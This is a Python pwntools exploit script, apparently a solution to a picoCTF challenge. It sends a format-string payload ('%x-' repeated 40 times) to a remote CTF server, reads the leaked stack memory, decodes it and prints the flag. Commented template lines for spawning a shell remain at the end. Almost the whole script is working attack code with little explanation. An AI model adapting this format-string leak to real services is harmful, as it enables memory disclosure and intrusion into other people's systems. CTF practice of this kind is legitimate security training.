#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from audioop import reverse
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
# exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


# def start(argv=[], *a, **kw):
#     '''Start the exploit against the target.'''
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# gdbscript = '''
# continue
# '''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

payload = b"%x-"*40

io = remote("mercury.picoctf.net",  33411)
io.recvuntil(b"io\n")
io.sendline(b"1\n")
io.recvuntil(b"?\n")
io.sendline(payload)
io.recvuntil(b":\n")
memory = io.recvline()


memory_decoded = memory.decode()
memory_decoded = memory_decoded.split("-")


ans = ""
for i in range(14, 23):
    if len(memory_decoded[i]) == 8:
        str = bytes.fromhex(memory_decoded[i]).decode()[::-1]
        ans += str
        print(str)

ans += '}'
print(ans)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# io.interactive()
